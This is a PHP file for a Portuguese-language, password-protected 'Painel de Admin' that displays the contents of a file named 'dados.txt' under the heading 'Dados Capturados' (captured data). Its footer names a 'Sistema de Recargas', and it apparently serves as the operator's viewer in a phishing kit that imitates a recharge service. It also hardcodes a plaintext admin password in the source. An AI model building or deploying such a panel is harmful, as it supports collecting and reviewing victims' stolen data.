<?php
$senha = "2333232";

if (!isset($_POST["senha"]) || $_POST["senha"] !== $senha) {
    echo "<!DOCTYPE html>
    <html lang='pt-br'>
    <head>
        <meta charset='UTF-8'>
        <meta name='viewport' content='width=device-width, initial-scale=1.0'>
        <title>Login de Admin</title>
        <link rel='stylesheet' href='css/style.css'>
        <style>
            body {
                background-color: #121212;
                font-family: 'Courier New', Courier, monospace;
                color: #00ff00;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
                text-align: center;
            }
            form {
                background-color: #222222;
                padding: 30px;
                border-radius: 10px;
                box-shadow: 0 0 15px rgba(0, 255, 0, 0.6);
            }
            input {
                background-color: #333333;
                border: 2px solid #00ff00;
                color: #00ff00;
                padding: 10px;
                margin-bottom: 15px;
                width: 250px;
                border-radius: 5px;
            }
            button {
                background-color: #00ff00;
                color: #121212;
                font-weight: bold;
                padding: 12px 25px;
                border: none;
                border-radius: 5px;
                cursor: pointer;
            }
            button:hover {
                background-color: #00cc00;
            }
        </style>
    </head>
    <body>
        <form method='POST'>
            <h1>Painel de Admin</h1>
            <input type='password' name='senha' placeholder='Senha de admin' required>
            <button type='submit'>Entrar</button>
        </form>
    </body>
    </html>";
    exit;
}

echo "<!DOCTYPE html>
<html lang='pt-br'>
<head>
    <meta charset='UTF-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>Painel de Admin</title>
    <link rel='stylesheet' href='css/style.css'>
    <style>
        body {
            background-color: #121212;
            font-family: 'Courier New', Courier, monospace;
            color: #00ff00;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            flex-direction: column;
        }
        h2 {
            color: #00ff00;
            text-transform: uppercase;
        }
        pre {
            background-color: #1c1c1c;
            border: 2px solid #00ff00;
            color: #00ff00;
            padding: 20px;
            width: 80%;
            max-width: 800px;
            margin-top: 20px;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.6);
            font-size: 16px;
            overflow: auto;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        footer {
            margin-top: 30px;
            font-size: 14px;
            color: #00ff00;
        }
    </style>
</head>
<body>
    <h2>Dados Capturados:</h2>
    <pre>";
if (file_exists("dados.txt")) {
    echo file_get_contents("dados.txt");
} else {
    echo "Nenhum dado capturado ainda.";
}
echo "</pre>
    <footer>
        <p>&copy; 2025 Sistema de Recargas. Todos os direitos reservados.</p>
    </footer>
</body>
</html>";
?>
